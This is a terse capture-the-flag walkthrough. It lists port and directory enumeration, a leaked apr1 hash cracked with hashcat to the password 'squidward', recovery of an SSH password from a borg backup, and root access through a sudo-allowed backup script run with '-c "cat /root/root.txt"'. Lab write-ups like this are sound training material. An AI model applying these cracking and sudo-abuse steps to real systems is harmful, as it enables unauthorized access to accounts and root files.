nmap shows 2 ports open, p22, p80
gobuster shows /admin, /etc

/etc/passwd = music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
apr1 hash

hashcat bruteforce hash cracked: squidward

Download the archive from the website
Search the archive, it leads to a tool called "borg"
Go to the website related to "borg" mentioned on the README file
Extract the final_archive using borg
We have a backup of the user's home
Find the password for alex, login using ssh

For privesc:
sudo -l
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"

-c indicates that the texts following should be treated as a command
